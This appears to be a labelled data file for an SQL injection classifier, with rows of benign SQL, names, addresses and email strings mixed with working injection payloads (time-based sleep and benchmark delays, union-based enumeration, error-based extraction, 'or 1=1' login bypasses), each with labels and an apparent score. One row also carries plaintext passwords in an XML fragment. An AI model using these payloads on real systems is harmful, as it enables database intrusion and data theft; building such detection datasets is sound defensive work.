select sleep  (  5  )   and 'hhrw' like 'hhrw,1,1,1.0
spnola ballado,0,0,0.004468253314358248
1.86e+15,0,0,0.0
select avg ( safety ) from able,0,0,0.0
"  select recently,setting from century where be = 'solve' union select avoid, addition from front",0,0,0.0
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1,1,1.0
"   select lower,cool,suggest,area,whenever     (  (  salmon join tried on factor.smooth =  army.definition )   inner join dishon orders.girl =  depth.shelterid ) ",0,0,0.21
select dollar ( s )  from stiff select root from contrast,0,0,0.0
"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
from  ( select distinct simply from fish ) ,0,0,0.0
select * from heat  where slight = activity,0,0,0.0
" select * from users where id  =  1 + $+%1 union select null,@@version -- 1",1,1,1.0
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1,1,1.0
select * from willing,0,0,0.0
46266,0,0,0.004468253314358248
select * from just where cave = 'twenty'  and  ( baseball = 'volume' or struggle = 'available' ) ,0,0,0.0
select * from met where even = 'certainly'  or property = 'consonant',0,0,0.0
5320,0,0,0.004468253314358248
select * from  ( select gasoline from busy ) ,0,0,0.0
select count ( * )  as consonant,0,0,0.0
select * from buffalo where price not between 10 and 20,0,0,0.0
96761343k,0,0,0.004468253314358248
1  )   and 3861  =  5813--,1,1,1.0
vilanova de arousa,0,0,0.0
"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1,1,1.0
69364169x,0,0,0.004468253314358248
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,1,1,1.0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1,1,0.99
select * from pair where identity not like '[chain]%',0,0,0.0
select * from unless where    not fine = 'comfortable',0,0,0.0
select * from object where farm between '1996-07-01' and '1996-07-31',0,0,0.0
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,1,1,1.0
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,1,1.0
"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1,1,1.0
7.86e+15,0,0,0.0
57584234p,0,0,0.004468253314358248
daly@diagnosticoradiologico.jm,0,0,0.004468253314358248
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,1,1,1.0
" select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1",1,1,1.0
"avinguda castellot, 116,",0,0,0.0037481886285371264
"select * from rule where balance between ""plastic"" and    ""whatever""",0,0,0.0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl",1,1,1.0
"   select breakfast, proud+ ', ' + label+ ' ' + got+ ', ' + some as neck  from bark",0,0,0.0
select * from post,0,0,0.0
91494736t,0,0,0.004468253314358248
19275,0,0,0.004468253314358248
"primavera, 174",0,0,0.004468253314358248
"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1,1,1.0
"-5013'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'ehwh' like 'ehwh",1,1,1.0
select ruler ( s )  from liquid,0,0,0.0
1'1,1,1,0.99
5he1un,0,0,0.004468253314358248
select count ( broke )  from zulu,0,0,0.0
"  select * from twice where lost not in  ( 'bit', 'typical', 'darkness' )  ",0,0,0.0
select * from below where tonight = 'sick'  and  ( year = 'labor' or she = 'too' ) ,0,0,0.0
select * from  ( select remove from community ) ,0,0,0.0
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1,1,1.0
"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",1,1,1.0
select * from open order by telephone,0,0,0.0
destullecer,0,0,0.004468253314358248
deiadrel,0,0,0.004468253314358248
select * from then where not gravity = 'between'  and not another = 'pack',0,0,0.01
1'||  (  select 'ghby' from dual where 4854  =  4854,1,1,1.0
select * from goes fetch first 3 rows only,0,0,0.0
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
1%'   )    )    and 3721  =  2597#,1,1,1.0
select min ( body )  as mixture from cheese,0,0,0.0
acachorrar,0,0,0.004468253314358248
$  (  sleep 50  ) ,1,1,0.5603404475788207
select * from needs where into between printed09/01/1996prize and exclaimed15/31/1996scale,0,0,0.0
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select * from sure where mass = 'unknown'  or leaving = 'worse',0,0,0.0
"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",1,1,1.0
1  )   as tykp where 6851  =  6851,1,1,1.0
"   select count ( trip ) , apart from fish by rain",0,0,0.0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",1,1,1.0
c356conio,0,0,0.004468253314358248
select avg ( darkness ) from women,0,0,0.0
select top 3 * from actual select * from moving 3select * from plate,0,0,0.0
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1,1,1.0
gaianes,0,0,0.004468253314358248
1'+  (  select qugu where 2287  =  2287 order by 1#,1,1,1.0
"1%'   )    )    union all select null,null,null,null,null,null,null--",1,1,1.0
"  select trunk,bare,speak from mirror left join orders on leader.streamid =  species.hearing order by feel.anything",0,0,0.0
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",1,1,1.0
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",1,1,1.0
select * from either  where changing not like '[require]%',0,0,0.0
"  select cheeseid as id, obtain as fed from stay",0,0,0.0
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",1,1,1.0
inescourt7@citycvs.mil,0,0,0.004468253314358248
 update smooth set log = 'in'where top = 'cotton',0,0,0.04
c/ arco de veronicas s/n 4e,0,0,0.0
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1,1,1.0
"   select sound, pleasure, you from surface where strength  is null",0,0,0.0
select shinning ( s )  from upward union all,0,0,0.0
-2817%'  )   or 8255  =  3841--,1,1,1.0
koprulu,0,0,0.004468253314358248
carstens,0,0,0.004468253314358248
23266,0,0,0.004468253314358248
"  select differenceid as id, gather as late from chair",0,0,0.0
comalada,0,0,0.004468253314358248
select easy ( s )  from establish union,0,0,0.0
"1""   )    )   ",1,1,0.98
select top 3 * from finger where eye = 'paragraph',0,0,0.0
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,1,1,1.0
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
select end ( s from stream right join,0,0,0.09
select scientific ( s )  from term union all,0,0,0.0
"1%""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1,1,1.0
3.12382e+15,0,0,0.0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1,1,0.99
"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,0.99
45810,0,0,0.004468253314358248
-9660   )    )    or 9762  =  9698,1,1,1.0
geir,0,0,0.004468253314358248
select * from clay where shallow in  ( select enough from flag ) ,0,0,0.0
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",1,1,1.0
1 where 1519  =  1519,1,1,1.0
select top 50 percent * from rubbed,0,0,0.0
randera,0,0,0.004468253314358248
26562587w,0,0,0.004468253314358248
select min ( why )  as pain from among,0,0,0.0
"talavera 56,",0,0,0.004468253314358248
albiol,0,0,0.004468253314358248
select * from per order by younger desc,0,0,0.0
1 where 7882  =  7882,1,1,1.0
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'sucj'  =  'sucj",1,1,1.0
select * from universe where within not between 'using' and 'public',0,0,0.0
ajuagas,0,0,0.004468253314358248
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",1,1,1.0
select * from customers  order by country desc;,0,0,0.0
1'  )   as ftyp where 5851  =  5851 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"  select * from nobody where vertical in  ( 'neighborhood', 'spent', 'opportunity' )  ",0,0,0.0
samm@lawn.sn,0,0,0.003983800240513096
"select * from generate_series  (  8147,8147,case when   (  8147  =  6336  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"c/ del ferrocarril, 152,",0,0,0.0
select * from sat where not beat = 'soon'  and not wire = 'island',0,0,0.0
91328189l,0,0,0.004468253314358248
;waitfor delay '0:0:__time__'--,1,1,0.99
"   select count ( everywhere ) , smoke from total by degree",0,0,0.0
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",1,1,0.99
select top 3 * from said,0,0,0.0
"   select shot,bigger,needed,population,beyond     (  (  forth join discuss on thrown.number =  trouble.produce )   inner join indicateon orders.arrive =  neck.unusualid ) ",0,0,0.0
select * from fly where trace = 'rubbed',0,0,0.0
?s,1,1,0.99
"1   )    )     )   union all select null,null,null,null,null,null#",1,1,1.0
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
7960,0,0,0.004468253314358248
select * from doing,0,0,0.0
"  select thank as dried, studied as [refused]  from land",0,0,0.0
select top 50 percent * from obtain select * from section fetch first 50 percent rows onlyselect top 3 * from basket,0,0,0.0
select * from paint where spite not between 'eye' and 'giving',0,0,0.0
select avg ( price ) from frame,0,0,0.0
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1,1.0
select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,1,1,1.0
n,1,0,0.012968046660272936
"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",1,1,1.0
4350,0,0,0.004468253314358248
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",1,1,1.0
1'   )    )    as dckd where 1794  =  1794,1,1,1.0
de]]>  </email_address>   <find_account_answer>  <![cdata[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![cdata[6]]>  </find_account_question>   <homepage>  <![cdata[]]>  </homepage>   <is_secret>  <![cdata[]]>  </is_secret>   <methodcall>   <mid>  <![cdata[qna]]>  </mid>   <module>  <![cdata[member]]>  </module>   <nick_name>  <![cdata[elwoodbuckley041104]]>  </nick_name>   <params>   <password2>  <![cdata[yxg6dsf5iu]]>  </password2>   <password>  <![cdata[yxg6dsf5iu]]>  </p,0,0,0.3201196794953486
select * from planned where not ourselves = 'nervous'  and not open = 'particular',0,0,0.0
"admin"" or 1  =  1#",1,1,1.0
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",1,1,1.0
"av. benisa 43, 10d",0,0,0.004468253314358248
select top 3 * from pile select * from sad 3select * from family,0,0,0.0
select count ( wrong ) from work,0,0,0.0
select * from outline  where simplest not like '[hill]%',0,0,0.0
"-9208%""   )    )    or 8571  =  8571--",1,1,1.0
"-6520%""  )   order by 1#",1,1,1.0
1.44e+15,0,0,0.0
select min ( swim )  as evening from breathe,0,0,0.0
1'  )   where 8163  =  8163,1,1,1.0
28660,0,0,0.004468253314358248
select * from younger where build = 'rising'  or leather = 'animal',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262329 )  order by meta_id asc",0,0,0.0
select widely ( s )  from lonely full outer join,0,0,0.0
select count ( pine )  from cut,0,0,0.0
millana,0,0,0.004468253314358248
wambsgan,0,0,0.004468253314358248
" select * from track order by mix, discuss",0,0,0.0
select distinct corner from shore,0,0,0.0
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,1,1,1.0
"prat de llobregat, el",0,0,0.0
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,1,1,0.99
select * from private where out = 'plane'  and  ( needed = 'sheep' or blanket = 'receive' ) ,0,0,0.01
aineln,0,0,0.004468253314358248
928,0,0,0.004468253314358248
thiessen,0,0,0.004468253314358248
7.85716e+15,0,0,0.0
select top 3 * from ask where body = 'clearly' select * from donkey,0,0,0.0
ciadoncha,0,0,0.004468253314358248
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",1,1,1.0
waitfor delay '0:0:5'-- thuo,1,1,1.0
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1,1,1.0
select * from too where similar like '%material%',0,0,0.0
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""tvla""  =  ""tvla",1,1,1.0
sant andreu de la barca,0,0,0.0
select * from man  where have = closely,0,0,0.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_parent  =  27990 and  ( wp_posts.post_mime_type like 'image/%' )  and wp_posts.post_type  =  'attachment' and   (  (  wp_posts.post_status  =  'inherit'  )  )   order by wp_posts.menu_order asc limit 0, 1",0,0,0.2425
1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,1,1,1.0
select observe from yet union all select change from band order by voyage,0,0,0.0
1' where 5335  =  5335,1,1,1.0
21924971z,0,0,0.004468253314358248
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select noon ( s )  from wait select cup from open,0,0,0.0
1  )   as nwfz where 7365  =  7365 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,1.0
update `wp_options` set `option_value`  =  '0' where `option_name`  =  'medium_large_size_w',0,0,0.0725
arbcies,0,0,0.004468253314358248
rosi10,0,0,0.004468253314358248
select drive ( s )  from bit union,0,0,0.0
select * from clothes where not dear = 'deal'  and not adventure = 'table',0,0,0.0
"c/ benasau, 196, 10?h",0,0,0.0
"   select count ( oil ) , throat from spend by quite",0,0,0.0
"1"" where 2878  =  2878 union all select null,null,null,null,null#",1,1,1.0
47494,0,0,0.004468253314358248
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1,1,1.0
select * from he where deep = 'dug'  and  ( connected = 'picture' or place = 'now' ) ,0,0,0.0
-5113'   )    )     )   or 7200  =  3094--,1,1,1.0
5595,0,0,0.004468253314358248
select avg ( writer ) from metal,0,0,0.0
"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
lehmann cruanas,0,0,0.004468253314358248
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",1,1,1.0
1'   )    )     )   rlike   (  select   (  case when   (  4076  =  4881  )   then 1 else 0x28 end   )    )    and    (    (     (  'grzs'  =  'grzs,1,1,1.0
lavat@ajuntamentbarcelona20.gy,0,0,0.004468253314358248
select * from railroad where city = 'pencil' fetch first 3 rows only,0,0,0.0
bond@tomorrow.com.hk,0,0,0.0
select top 3 * from saddle select * from grow 3select * from century,0,0,0.0
select top 3 * from goose where nearest = 'doubt' select * from neighborhood,0,0,0.0
fonterosa vjar,0,0,0.004468253314358248
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1,1,1.0
1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#,1,1,1.0
select * from group,0,0,0.0
 update refused set dance = 'job'where worth = 'sister',0,0,0.0
afasia,0,0,0.004468253314358248
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,1,1,1.0
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",1,1,1.0
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1,1,1.0
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,1,1.0
"1%""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1,1,1.0
-3105' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'srep'  =  'srep,1,1,1.0
"  select create,bottom from pretty where familiar = 'play' union select tower, opinion from go",0,0,0.0
select * from planning where meal = 'property',0,0,0.0
"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,1,1.0
t6r551ero,0,0,0.004468253314358248
select * from doing order by week desc,0,0,0.0
"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,1,1,1.0
select sentence ( s from top right join,0,0,0.0
jamaal,0,0,0.004468253314358248
select clay,0,0,0.03250505488953901
select * from tongue where left = 'father' limit 3,0,0,0.0
naestiberger@biogasworld.rs,0,0,0.004468253314358248
select * from pretty where up  between 10 and 20,0,0,0.0
select * from tube where hollow between '1996-07-01' and '1996-07-31',0,0,0.0
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",1,1,1.0
select * from  ( select say from fire ) ,0,0,0.0
4077,0,0,0.004468253314358248
1.93115e+15,0,0,0.0
"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
select avg ( price ) from home,0,0,0.0
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",1,1,1.0
12190,0,0,0.004468253314358248
"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1,1,1.0
select bow ( s from doubt right join,0,0,0.0
select * from rhythm where strength = 'widely'  and city = 'supply',0,0,0.0
"avinguda carrilet, 21,",0,0,0.05079856647241355
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",1,1,1.0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,1,1.0
4.85943e+15,0,0,0.0
4.4334e+15,0,0,0.0
" select * from users where id  =  '1' + $ . union select 1,@@version -- 1'",1,1,0.99
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",1,1,1.0
p4rtapaz,0,0,0.004468253314358248
"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,1.0
andrs castanyer,0,0,0.004468253314358248
"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0.98
"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""cyyh""  =  ""cyyh",1,1,1.0
6r5int3805,0,0,0.004468253314358248
66837882c,0,0,0.004468253314358248
89388462c,0,0,0.004468253314358248
select avg ( experiment ) from remain select sum ( apartment ) ,0,0,0.0
"insert into quarter  ( plan, taken, country )  values  ( 'tiny', 'needed', 'clock' )  ",0,0,0.03
1' where 6135  =  6135,1,1,1.0
-4562'  )   or 3038  =  3038,1,1,1.0
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
select * from identity where burn between '1996-07-01' and '1996-07-31',0,0,0.0
select * from additional where thou = 'not',0,0,0.0
select avg ( several ) from buffalo,0,0,0.0
"insert into title ( somehow, gentle, anywhere, sight, wheel, street )  values  ( 'house', 'organization'. pencil', 'stepped', 'iron', 'including', 'supply' )  ",0,0,0.0
select * from married,0,0,0.0
"1'   )    )     )   union all select null,null#",1,1,1.0
1' where 8099  =  8099,1,1,1.0
"-2448%""  )   or 3038  =  3038",1,1,1.0
"   select jet, tide, weak from park where short  is null",0,0,0.0
"c/ carranque, 113 5?a",0,0,0.0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,1,1.0
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,1,1,1.0
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",1,1,1.0
select top 50 percent * from magnet,0,0,0.0
select * from receive fetch first 3 rows only,0,0,0.0
1'   )    )     )   order by 1#,1,1,1.0
-1479%' or 5201  =  3398--,1,1,1.0
"  update cry set feel =  'operation', city =  'stage' where wrapped =  melted",0,0,0.0
"  select * from oxygen where teach not in  ( 'pig', 'give', 'comfortable' )  ",0,0,0.0
select * from mouth where copy = 'universe'  or done = 'men',0,0,0.0
1'+  (  select 'zgtu' where 8419  =  8419,1,1,1.0
"  select quick,equator,child from press left join orders on increase.suggestid =  master.village order by route.tent",0,0,0.0
select * from kids order by circle,0,0,0.0
antone1@tiendasyofertas.ve,0,0,0.004468253314358248
1'  )   where 9272  =  9272,1,1,1.0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,1.0
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1,1,1.0
select why ( s ) from cow inner join,0,0,0.0
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,1,1.0
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,1.0
28413,0,0,0.004468253314358248
8.32456e+15,0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_type_2720' limit 1,0,0,0.0
33470889r,0,0,0.004468253314358248
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1,1,1.0
select count ( distinct end )  from doctor,0,0,0.14
" select * from floor order by useful, general",0,0,0.0
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",1,1,1.0
"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select min ( without )  as pool from mental,0,0,0.0
select min ( lips )  as giant from mixture,0,0,0.0
mcanally@rockefeller.bt,0,0,0.004468253314358248
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1,1,1.0
"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",1,1,1.0
ling-yu,0,0,0.006527024015406931
17179,0,0,0.004468253314358248
"   select rose, taste+ ', ' + money+ ' ' + stick+ ', ' + handsome as disappear  from guard",0,0,0.0
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ican' like 'ican",1,1,1.0
ayate,0,0,0.004468253314358248
select min ( compound )  as underline from crowd,0,0,0.0
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,1,1.0
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1,1.0
"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",1,1,1.0
c/ mayolica 158 4a,0,0,0.0
"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1,1,0.99
